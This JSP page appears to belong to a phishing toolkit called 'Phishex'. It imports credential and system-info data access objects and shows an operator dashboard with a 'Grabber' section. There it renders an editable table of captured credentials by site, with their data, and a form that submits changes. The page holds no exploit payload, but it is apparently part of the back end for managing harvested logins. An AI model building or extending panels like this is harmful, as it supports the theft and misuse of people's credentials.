<%@ page import="java.util.Scanner" %>
<%@ page import="java.util.concurrent.TimeUnit" %>
<%@ page import="com.phishex.dao.CredentialsDao" %>
<%@ page import="com.phishex.dao.SysInfoDao" %>
<%@ page import="com.phishex.entity.Credentials" %>
<%@ page import="java.util.List" %>
<%@ page import="com.phishex.entity.SysInfo" %><%--
  Created by IntelliJ IDEA.
  User: xuser
  Date: 4/15/20
  Time: 12:24 PM
  To change this template use File | Settings | File Templates.
--%>
<%@ page contentType="text/html; charset=UTF-8" %>
<%@ taglib uri = "http://java.sun.com/jsp/jstl/core" prefix = "c" %>
<head>
    <meta charset="utf-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
    <title>
        Edit
    </title>
    <meta content='width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0, shrink-to-fit=no' name='viewport' />
    <!-- CSS Files -->
    <link href="css/bootstrap.min.css" rel="stylesheet" />
    <link href="css/now-ui-dashboard.css?v=1.5.0" rel="stylesheet" />
</head>

<body class="">
<div class="wrapper ">
    <div class="sidebar" data-color="orange">
        <div class="logo">
        <span class="simple-text logo-normal">
            Phishex
        </span>
        </div>
        <div class="sidebar-wrapper" id="sidebar-wrapper">
            <ul class="nav">
                <li class="active ">
                    <a href="/dashboard">
                        <i class="now-ui-icons"></i>
                        <p>Dashboard</p>
                    </a>
                </li>
                <li>
                    <a href="${pageContext.request.contextPath}/">
                        <i class="now-ui-icons"></i>
                        <p>Grabber</p>
                    </a>
                </li>

            </ul>
        </div>
    </div>
    <div class="main-panel" id="main-panel">
        <div class="panel-header">
        </div>
        <div class="content">
            <c:set var="credsError" scope="page" value="${credsError}"/>
            <c:set var="error" scope="page" value="${error}"/>

            <div class="row fadeIn first">
                <div class="col-md-12">
                    <div class="card">
                        <div class="card-header">
                            <h4 class="card-title"> Edit</h4>
                            <c:if test="${error != null}">
                                <h6 class="text-danger font-weight-normal">${error}</h6>
                            </c:if>
                        </div>
                        <div class="card-body">
                            <div class="table-responsive">
                                <form name="grabber" action="${pageContext.request.contextPath}/submit_changes">
                                <table class="table">
                                    <thead class=" text-primary">
                                    <th class="col-md-1">
                                        Site
                                    </th>
                                    <th class="col-md-11">
                                        Data
                                    </th>
                                    </thead>
                                    <tbody>
                                    <c:if test="${credsError != null}">
                                        <tr>
                                            <td>
                                                <span class="text-danger">${credsError}</span>
                                            </td>
                                        </tr>
                                    </c:if>
                                    <c:if test="${credsError == null}">
                                        <c:forEach items="${credentials}" var="creds">
                                            <tr>
                                                <input type="text" name="id" value="${creds.getId()}" hidden>
                                                <td class="col-md-1 font-weight-normal">
                                                    <input type="text" width="100" name="site" value="${creds.getSite()}">
                                                </td>
                                                <td class="col-md-11">
                                                    <textarea cols="80" rows ="5" name="data">${creds.getData()}</textarea>
                                                </td>
                                            </tr>
                                        </c:forEach>
                                    </c:if>
                                    </tbody>
                                </table>
                                    <input type="submit" class="btn btn-round btn-outline-default float-right" value="Submit">
                                </form>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>
</div>
<!--   Core JS Files   -->
<script src="js/core/jquery.min.js"></script>
<script src="js/core/popper.min.js"></script>
<script src="js/core/bootstrap.min.js"></script>
<script src="js/plugins/perfect-scrollbar.jquery.min.js"></script>
<!-- Chart JS -->
<script src="js/plugins/chartjs.min.js"></script>
<!-- Control Center for Now Ui Dashboard: parallax effects, scripts for the example pages etc -->
<script src="js/now-ui-dashboard.min.js?v=1.5.0" type="text/javascript"></script><!-- Now Ui Dashboard DEMO methods, don't include it in your project! -->
<script src="js/demo/demo.js"></script>
<script>
    $(document).ready(function() {
        demo.initDashboardPageCharts();

    });
</script>
</body>

</html>

